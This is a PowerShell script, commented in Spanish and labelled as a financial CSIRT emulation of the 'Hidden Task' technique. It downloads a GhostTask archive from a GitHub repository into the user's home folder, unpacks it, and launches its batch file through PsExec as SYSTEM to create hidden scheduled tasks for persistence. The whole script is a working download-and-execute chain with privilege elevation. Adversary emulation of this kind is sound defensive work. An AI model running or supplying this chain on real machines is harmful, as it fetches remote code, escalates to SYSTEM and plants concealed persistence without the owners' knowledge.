# Configuración inicial
try {
    $Host.UI.RawUI.BackgroundColor = "Black"
    Clear-Host
    Write-Host "[CSIRT FINANCIERO AHIBA, Emulacion de la tecnica Hiddent Task]" -ForegroundColor Green  
    Write-Host "[Actividad 01. Ejecucion de artefacto GhostTask para la creacion de tareas programadas ocultas.] "  -ForegroundColor Green
}
catch {
    Write-Host "Error general: $_" -ForegroundColor Red
    exit 1
}
    # Obtener la ruta del directorio del usuario actual
    try {
        $directorioTemporal = $env:HOMEPATH
		Write-Host " "
        Write-Host "Se obtiene la ruta del directorio del usuario actual." -ForegroundColor Green 
        
    }
    catch {
        Write-Host "Error al obtener la ruta del directorio del usuario actual: $_" -ForegroundColor Red
        Start-Sleep -Seconds 5
        Write-Host "Presiona cualquier tecla para cerrar PowerShell"
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit 1
    }

    # Crear el directorio donde se van a descargar los archivos necesarios para ejecutar las acciones maliciosas
try {
	Write-Host " "
    Write-Host "Creando directorio..." -ForegroundColor Green 
	Start-Sleep -s 1.5
    $workingPath = "HiddenTask"
    $nuevaRuta = Join-Path -Path $directorioTemporal -ChildPath $workingPath

    if (Test-Path -Path $nuevaRuta) {
        Remove-Item -Path $nuevaRuta -Recurse -Force
    }
    New-Item -ItemType Directory -Path $nuevaRuta -ErrorAction Stop | Out-Null
}
catch {
    Write-Host "Error al crear el directorio." -ForegroundColor Red
    Write-Host "Presiona cualquier tecla para cerrar PowerShell"
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

    # Descargar el archivo de GitHub
    try {
		
        $urlArchivoMal = "https://github.com/taysec/Test_HiddenTask/raw/main/HiddenTask%20with%20GhostTask/GhostTask.zip"
        $fileName = "GhostTask.zip"
        $rutaArchivo = Join-Path -Path $nuevaRuta -ChildPath $fileName
		Start-Sleep -s 1
		Write-Host " "
		Write-Host "Descargar archivos necesarios para la ejecucion" -ForegroundColor Green
        Write-Host " "
		Invoke-WebRequest -Uri $urlArchivoMal -OutFile $rutaArchivo
		Start-Sleep -s 1
		Write-Host "Descarga de archivo correcta" -ForegroundColor Green
		Write-Host " "
    }
    catch {
        Write-Host "Error al descargar el archivo: $_" -ForegroundColor Red
		Write-Host "Presiona cualquier tecla para salir..."
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit 1
    }

    # Descomprimir el archivo
    try {
        $rutaDescompresion = Join-Path -Path $nuevaRuta -ChildPath "Descomprimido"
        Expand-Archive -Path $rutaArchivo -DestinationPath $rutaDescompresion -ErrorAction Stop
		Start-Sleep -s 1
        Write-Host "Descomprimir el archivo." -ForegroundColor Green 
        Write-Host " "
    }
    catch {
        Write-Host "Error al descomprimir el archivo: $_" -ForegroundColor Red
		Write-Host "Presiona cualquier tecla para salir..."
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit 1
    }

    # Elevación de privilegios a través de psexec ejecutando lanzador de GhostTask
    try {
        $psExec = Join-Path -Path $rutaDescompresion -ChildPath "PsExec.exe"
        $batExec = Join-Path -Path $rutaDescompresion -ChildPath "launch.bat"
        Start-Sleep -s 1
		Write-Host "Elevación de privilegios a través de psexec ejecutando lanzador de GhostTask." -ForegroundColor Green
        Start-Sleep -s 1
		Start-Process -FilePath $psExec -ArgumentList "-accepteula", "-i", "-s", $batExec -Verb "runas"
		Write-Host " "
		Write-Host "Presiona cualquier tecla para cerrar PowerShell"
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    catch {
        Write-Host "Error al elevar privilegios o ejecutar GhostTask: $_" -ForegroundColor Red
		Write-Host "Presiona cualquier tecla para salir..."
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit 1
    }

